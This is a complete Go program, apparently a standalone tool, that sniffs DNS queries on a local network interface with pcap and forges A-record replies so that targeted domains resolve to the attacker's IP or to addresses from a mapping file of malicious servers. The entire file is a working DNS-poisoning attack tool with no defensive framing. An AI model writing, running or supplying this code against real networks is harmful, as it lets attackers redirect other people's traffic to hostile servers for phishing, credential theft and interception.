package main
import (
    "fmt"
    "net"
    "github.com/google/gopacket"
    "github.com/google/gopacket/layers"
    "github.com/google/gopacket/pcap"
    "github.com/pborman/getopt"
    "log"
    "strings"
	"os"
	"bufio"
)
var (
    handle       *pcap.Handle
    err          error
	poison_dict map[string]string
    local_ip net.IP
)
func dataHandler(packet gopacket.Packet) []byte {
    //This part picks IP layer from the packet
    ipv4Layer := packet.Layer(layers.LayerTypeIPv4)
    ipv4Packet, _ := ipv4Layer.(*layers.IPv4)
    src_ip := ipv4Packet.SrcIP

    //If the source IP is same as the attacker no need to poison
    if src_ip.Equal(local_ip){
        return nil
    }
    dst_ip := ipv4Packet.DstIP

    //This part picks DNS layer from the packet
    dnsLayer := packet.Layer(layers.LayerTypeDNS)
    dnsPacket, _ := dnsLayer.(*layers.DNS)

    //Creating a spoofed response
    qName_ := ""
    var answer layers.DNSResourceRecord
    answer.Type = layers.DNSTypeA
    answer.Class = layers.DNSClassIN
    answer.TTL = 1000
    answer.IP = local_ip
    dnsPacket.QR = true
    ret_val := false
    //Looping over all questions in the DNS Query 
    for _, q := range dnsPacket.Questions {
        //Checking if the map is filled
        //If filled then file provided for mapping
        //If not filled spoof all the DNS requests
        if poison_dict != nil{
            if _, val := poison_dict[string(q.Name)]; !val{
                continue
            } else{
                answer.IP = net.ParseIP(poison_dict[string(q.Name)])
            }
        }
        if q.Type != layers.DNSTypeA || q.Class != layers.DNSClassIN {
            continue
        }
        answer.Name = q.Name
        dnsPacket.Answers = append(dnsPacket.Answers, answer)
        dnsPacket.ANCount = dnsPacket.ANCount + 1
        ret_val = true
        qName_ = qName_ + string(q.Name) + " "
    }
    if !ret_val{
        return nil
    }

    ethernetLayer := packet.Layer(layers.LayerTypeEthernet)
    ethernetPacket, _ := ethernetLayer.(*layers.Ethernet)

    updLayer := packet.Layer(layers.LayerTypeUDP)
    udpPacket, _ := updLayer.(*layers.UDP)

    src_mac := ethernetPacket.SrcMAC
    dst_mac := ethernetPacket.DstMAC
    
    src_port := udpPacket.SrcPort
    dst_port := udpPacket.DstPort
    ethernetPacket.SrcMAC = dst_mac
    ethernetPacket.DstMAC = src_mac
    ipv4Packet.SrcIP = dst_ip
    ipv4Packet.DstIP = src_ip
    udpPacket.SrcPort = dst_port
    udpPacket.DstPort = src_port
	udpPacket.SetNetworkLayerForChecksum(ipv4Packet)

    // And create the packet with the layers
    buffer := gopacket.NewSerializeBuffer()
    options := gopacket.SerializeOptions{
        FixLengths:       true,
        ComputeChecksums: true,
    }
    gopacket.SerializeLayers(buffer, options,
     ethernetPacket,
     ipv4Packet,
     udpPacket,
     dnsPacket,
    )

    fmt.Printf("DNS Poison - %v:%v > %v:%v %v %v\n", src_ip, src_port, dst_ip, dst_port, dnsPacket.ID, qName_)

    finalPacket := buffer.Bytes()
    return finalPacket
}
func main() {

    //Finding the default Interface if not provided by the user in command-line
    inter_faces, _ := pcap.FindAllDevs()
    int_face := inter_faces[0]
    local_ip = int_face.Addresses[0].IP

    //This part is to read the values from the command-line flags
    inter_face := getopt.String('i', int_face.Name, "The interface to connect")
    file_name := getopt.String('f', "", "The filename for the mapping of malicious Server and target domain")
    getopt.Parse()

	if getopt.IsSet('f'){
		file, err := os.Open(*file_name)
  
		if err != nil {
			log.Fatalf("Failed to open the file mentioned. Spoofing all DNS Requests")
	
		}

        //Creating mapping for DNS => spoofed_IP that needs to be spoofed as per the file
		scanner := bufio.NewScanner(file)
		scanner.Split(bufio.ScanLines)
		poison_dict = make(map[string]string)
		for scanner.Scan() {
			text := strings.Fields(scanner.Text())
			poison_dict[text[1]] = text[0]
		}
		file.Close()

	}

    handle, err = pcap.OpenLive(*inter_face, 1024, true, pcap.BlockForever)
    if err != nil {
        log.Fatal(err)
    }
    defer handle.Close()
    //This part checks if there are any non-parameteric values in command-line
    //and uses them as expression for the BPF filter
    if len(getopt.Args()) > 0 {
        filter_input_array := getopt.Args()
        filter_input := strings.Join(filter_input_array, " ")
        handle.SetBPFFilter(filter_input)
    } else{
        handle.SetBPFFilter("udp and port 53")
    }

    fmt.Printf("dnspoison listening on interface [%s]\n", *inter_face)

    packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
    for packet := range packetSource.Packets() {
        dnsLayer := packet.Layer(layers.LayerTypeDNS)
        if dnsLayer != nil {
			dnsPacket := dnsLayer.(*layers.DNS)
			if !dnsPacket.QR {
				sendPacket := dataHandler(packet)
                if sendPacket == nil{
                    continue
                }
				err := handle.WritePacketData(sendPacket)
				if err != nil {
					fmt.Println("Error")
					log.Fatal(err)
				}
			}
        }
    }
}
